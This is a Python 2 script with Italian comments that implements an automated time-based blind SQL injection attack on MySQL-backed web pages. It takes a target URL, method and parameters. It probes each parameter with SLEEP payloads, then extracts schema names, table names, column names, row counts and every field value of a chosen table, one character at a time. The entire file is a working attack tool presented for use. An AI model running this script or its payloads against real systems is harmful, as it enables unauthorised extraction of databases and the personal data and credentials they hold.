import requests
import time
import sys
import binascii
import urlparse


if ( len( sys.argv ) <= 1 ):
	print("Sintassi del tool:\nparametro 1: link della pagina su cui fare injection\nparametro 2: metodo della richiesta(get o post)")
	print("parametro 3: parametri e valori da passare alla richiesta con virgolette, ex. 'key1=ciao&&key2=34'")
	sys.exit()

maxLength = 100
timeSleep = 2
error = 0.5
arrayCaratteri = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@. _-"
link = sys.argv[1]
method = sys.argv[2]
parametro = sys.argv[3]
stringPattern = ''

print(parametro)

stringLink = "aa?" + parametro
dictionary = dict(urlparse.parse_qsl(urlparse.urlsplit(stringLink).query))
print(dictionary)


def is_number(s):
    try:
        int(s)
        return type(int(s))
    except ValueError:
        return type(s)


injectKey = 0
if( method.upper() == "POST" ): 
	for key in dictionary:
		if(injectKey != 0):
			print("FINAL BREAK")
			break
		for i in range(0, 2):
			stringTest = ''
			if( i == 0):
				stringTest = str(dictionary[key]) + " AND SLEEP(" + str(timeSleep) + ")"
			else:
				stringTest = str(dictionary[key]) + " AND SLEEP(" + str(timeSleep) + ")-- -"#controllo se sono necessari i commenti o meno
			print(stringTest)																#nel caso sia un insert o una select
			tmp = dictionary[key]
			dictionary[key] = stringTest
			timeStart = time.time()
			print(dictionary)
			requests.post(link, data=dictionary)
			timeEnd = time.time()
			dictionary[key] = tmp
			if(timeEnd - timeStart > timeSleep):
				print("trovato un valore da su cui fare injection")
				injectKey = key
				if( i == 1 ):
					stringPattern = "-- -"
				break
elif( method.upper() == "GET" ):
	for key in dictionary:
		if(injectKey != 0):
			print("FINAL BREAK")
			break
		for i in range(0, 2):
			stringTest = ''
			q = dictionary[key]
			if is_number(q) is not int:
				q += "'"
			if( i == 0):
				stringTest = str(q) + " AND SLEEP(" + str(timeSleep) + ")"
			else:
				stringTest = str(q) + " AND SLEEP(" + str(timeSleep) + ")-- -"
			print(stringTest)
			tmp = dictionary[key]
			dictionary[key] = stringTest
			timeStart = time.time()
			print(dictionary)
			requests.get(link + "?" + key + "=" + dictionary[key])
			timeEnd = time.time()
			dictionary[key] = tmp
			if(timeEnd - timeStart > timeSleep):
				print("trovato un valore da su cui fare injection")
				injectKey = key
				dictionary[key] = q
				if( i == 1 ):
					stringPattern = "-- -"
				break
else:
	print("metodo sbagliato")
	sys.exit()
	
#injectKey e la chiave all'interno del dizionario a ci e collegato l'elemento injectable
valoreParametro = dictionary[injectKey]	



#funzione che esegue la richiesta di connessione in post o in get
def functionRequest(string):
	
	if method.upper() == "GET":
		
		r = requests.get(link + "?" + injectKey + "=" + string)
		
	else:
		
		dictionary[injectKey] = string
		r = requests.post(link, data=dictionary)

#usiamo la funzione maxDelay() per trovare il massimo tempo di risposta del server
	
def maxDelay():
	timeStart = time.time()
	functionRequest('1')
	timeEnd = time.time()
	return timeEnd - timeStart

maxD = 0
choice = raw_input("inserire yes se si desidera ottimizzare il tempo, diversamente viene utilizzato il tempo di default ")
if(choice == "yes"):
	listOfTime = []
	for i in range(0, 30):
		m = maxDelay()
		listOfTime.append(m)
	indexMax = listOfTime.index(max(listOfTime))			#ottimizzazione dei tempi
	del(listOfTime[indexMax])
	maxD = max(listOfTime)

if( maxD != 0):
	timeSleep = 4*maxD
else:
	timeSleep = 2
print ("timeSleep-> " + str(timeSleep))
	

#funzione che controlla la correttezza di un carattere, o in generale un valore trovato. Restituisce true se per due volte consecutive 
#viene fatta una sleep corrispondente a quel valore
def checkCorrectness(string):
	timeStart = time.time()
	functionRequest(string)
	timeEnd = time.time()
	if timeEnd - timeStart > timeSleep:
		timeStart = time.time()
		functionRequest(string)
		timeEnd = time.time()
		if timeEnd - timeStart > timeSleep:
			return True
		else:
			return checkCorrectness(string)
	else:
		return False
	
def getCharOfString(s):
	string = ''
	for j in range (0, len(s)):
		string += str(ord(s[j])) + ","
	newString = string[0:len(string)-1]
	return newString

#queste funzioni servono per costruire i vari payload da inviare nel seguito del tool
def payloadLengthDatabase(i, l):
	string = valoreParametro+" AND IF(LENGTH((Select SCHEMA_NAME from information_schema.schemata LIMIT " + str(i) + ",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	print(string)
	return string

def payloadNameDatabase(i, mid, char ):
	string = valoreParametro+" AND IF( ORD(MID((SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadLengthTables(databaseSelected, i, l):
	newString = getCharOfString(databaseSelected)
	string = valoreParametro+" AND IF(LENGTH((Select TABLE_NAME  from information_schema.tables WHERE TABLE_SCHEMA=CHAR(" + newString + ") LIMIT " + str(i) + ",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadNameTables(databaseSelected, i, mid, char):
	newString = getCharOfString(databaseSelected)
	string = valoreParametro+" AND IF( ORD(MID((Select TABLE_NAME  from information_schema.tables WHERE TABLE_SCHEMA=CHAR(" + newString + ") LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadLengthColumn(databaseSelected, table, i, l):
	db = getCharOfString(databaseSelected)
	tab = getCharOfString(table)
	string = valoreParametro+" AND IF(LENGTH((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=CHAR(" + db + ") AND TABLE_NAME = CHAR("+tab+") LIMIT " + str(i) + ",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadNameColonne(databaseSelected,table, i, mid, char):
	db = getCharOfString(databaseSelected)
	tab = getCharOfString(table)
	string = valoreParametro+" AND IF( ORD(MID((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=CHAR(" + db + ") AND TABLE_NAME = CHAR("+tab+") LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP("+str(timeSleep)+"), SLEEP(0))"+stringPattern
	return string

def payloadLength(campo,i,nomeTabella):
	lunghezza = 0
	for l in range(0,maxLength):
		string = valoreParametro + " AND IF(LENGTH((SELECT " + campo + " FROM "+ nomeTabella +" LIMIT " + str(i) +",1))=" + str(l) + ", SLEEP("+str(timeSleep)+"), 		SLEEP(0))" + stringPattern
		if checkCorrectness(string):
			lunghezza = l
			break
	return lunghezza

def numberOfTuple(nomeTabella, i):
	string = valoreParametro + " AND IF((SELECT count(*) FROM " + nomeTabella + " ) = " + str(i) + " , SLEEP("+str(timeSleep)+"), 		SLEEP(0))"+stringPattern
	return string

def payloadNomeCampo(campo,lunghezzaCampo,nomeTabella,i):
	nomeCampo = ''	
	for mid in range(1,lunghezzaCampo+1):
		for char in arrayCaratteri:
			string = valoreParametro+" AND IF( ORD(MID((SELECT "+campo +" FROM "+ nomeTabella +" LIMIT " + str(i) + ",1) ," + str(mid)+",1))="+ str(ord(char))+", SLEEP(" +str(timeSleep)+"), SLEEP(0))"+stringPattern
			if checkCorrectness(string):
				nomeCampo += char
				break
	return nomeCampo



i = 0
fine = 0
continua = True
arrayLunghezzaDatabaseName = []
#calcolo la lunghezza dei nomi del database
while(continua):
	for l in range(0,maxLength):
		string = payloadLengthDatabase(i,l)
		if checkCorrectness(string):
			arrayLunghezzaDatabaseName.append(l)
			print("lunghezza-> " + str(l) )
			fine = 1
			break
		if l == maxLength-1 and fine == 0:
			continua = False 
	i = i + 1
	fine = 0

print("calcolo nome database")
#calcolo i nomi del database
numeroDatabase = len(arrayLunghezzaDatabaseName)
nomeDatabase = []
stringaNomeDatabase = ''
for i in range(0,numeroDatabase):
	for mid in range(0,arrayLunghezzaDatabaseName[i]):
		for char in arrayCaratteri:
			string = payloadNameDatabase(i,mid+1,char)
			if checkCorrectness(string):
				stringaNomeDatabase+=char
				break
	
	nomeDatabase.append(stringaNomeDatabase)
	stringaNomeDatabase=''

databaseSelected = ''
end = True
while (end):
	for i in nomeDatabase:
		print (i)
	databaseSelected = raw_input("selezionare uno tra i seguenti database: ")
	for i in nomeDatabase:
		if i == databaseSelected:
			print ("ok")
			end = False
			break 
	

continua = True
arrayLunghezzaTabelle = []
i = 0
fine = 0
print("database selezionato: " + databaseSelected)

#calcolo la lunghezza dei nomi delle tabelle
while(continua):
	
	for l in range(0,maxLength):
		
		string = payloadLengthTables(databaseSelected, i, l)
		print(string)
		print("lunghezza-> " + str(l))
		if checkCorrectness(string):
			print("lunghezzaDefinitivaTabella-> " + str(l))
			arrayLunghezzaTabelle.append(l)
			fine = 1
			break
		if l == maxLength-1 and fine == 0:
			continua = False 
	i = i + 1
	fine = 0

print("**********************")

#calcolo i nomi delle tabelle
numeroTabelle = len(arrayLunghezzaTabelle)
nomeTabella = []
stringaNomeTabella = ''
for i in range(0,numeroTabelle):
	for mid in range(0,arrayLunghezzaTabelle[i]):
		for char in arrayCaratteri:
			string = payloadNameTables(databaseSelected, i, mid + 1, char)
			if checkCorrectness(string):
				stringaNomeTabella += char
				break
	nomeTabella.append(stringaNomeTabella)
	print(stringaNomeTabella)
	stringaNomeTabella=''


tableSelected = ''
end = True
while (end):
	for i in nomeTabella:
		print (i)
	tableSelected = raw_input("selezionare una tra le seguenti tabelle: ")
	for i in nomeTabella:
		if i == tableSelected:
			print ("ok")
			end = False
			break
print("tabella selezionata: " + tableSelected)


i = 0
fine = 0
continua = True
arrayLunghezzaColumns = []
#calcolo la lunghezza dei campi che costituiscono la tabelle che ho selezionato al passo precedente
while(continua):
	for l in range(0, maxLength):
		string = payloadLengthColumn(databaseSelected, tableSelected, i, l)
		print (string)
		if checkCorrectness(string):
			arrayLunghezzaColumns.append(l)
			print ("lunghezza definitiva -> " + str(l))
			fine = 1
			break
		if l == maxLength-1 and fine == 0:
			continua = False 
	i = i + 1
	fine = 0

#calcolo i nomi dei campi costituenti la tabella
numeroColonne = len( arrayLunghezzaColumns )
nomeColonna = []
stringaNomeColonna = ''
for i in range(0,numeroColonne):
	for mid in range(0,arrayLunghezzaColumns[i]):
		for char in arrayCaratteri:
			string = payloadNameColonne(databaseSelected,tableSelected, i, mid + 1, char)
			print(string)
			if checkCorrectness(string):
				stringaNomeColonna += char
				break
	nomeColonna.append(stringaNomeColonna)
	print(stringaNomeColonna)
	stringaNomeColonna=''

#CALCOLO IL NUMERO DI TUPLE
i = 0
numeroTuple = 0
exit = True
while(exit):
	string = numberOfTuple(tableSelected, i)
	print(string)
	if checkCorrectness(string):
		numeroTuple = i
		exit = False
	i += 1
print("numero tuple -> " + str(numeroTuple))		


#per ogni tupla trovo la lunghezza del valore dei vari campi
arrayTuplaLunghezzaCampo = []
arrayTuplaLunghezzaCampiTotale = []
for i in range(0, numeroTuple):
	for j in range(0, numeroColonne):
		lunghezza =  payloadLength(nomeColonna[j],i,tableSelected)
		arrayTuplaLunghezzaCampo.append(lunghezza)
	arrayTuplaLunghezzaCampo.append(i)
	arrayTuplaLunghezzaCampiTotale.append(arrayTuplaLunghezzaCampo)
	arrayTuplaLunghezzaCampo = []

#trovo i vari valori della tabella
arrayNomi = []
for tuplaLunghezze in arrayTuplaLunghezzaCampiTotale:
	for lunghezzaCampo in range(0, len(tuplaLunghezze)-1):
		valoreCampo = payloadNomeCampo(nomeColonna[lunghezzaCampo],tuplaLunghezze[lunghezzaCampo],tableSelected, arrayTuplaLunghezzaCampiTotale.index(tuplaLunghezze))
		print(valoreCampo)













